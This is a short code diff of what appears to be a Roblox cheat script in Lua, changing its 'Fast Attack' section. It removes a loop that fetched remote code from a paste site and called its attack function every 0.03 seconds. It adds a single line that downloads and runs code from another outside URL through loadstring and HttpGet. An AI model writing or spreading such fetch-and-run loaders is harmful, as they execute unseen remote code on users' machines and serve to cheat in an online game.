@@ -70,14 +70,4 @@ end)
 
 --// Fast Attack Main
 
-_G.AttackM = true
-_G.AttackP = true
-_G.Animation = false
-
-local Load = loadstring(game:HttpGet("https://pastefy.app/zGvNP4d1/raw"))()
-
-task.spawn(function()
-    while task.wait(0.03) do
-        Load:Attack()
-    end
-end)
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
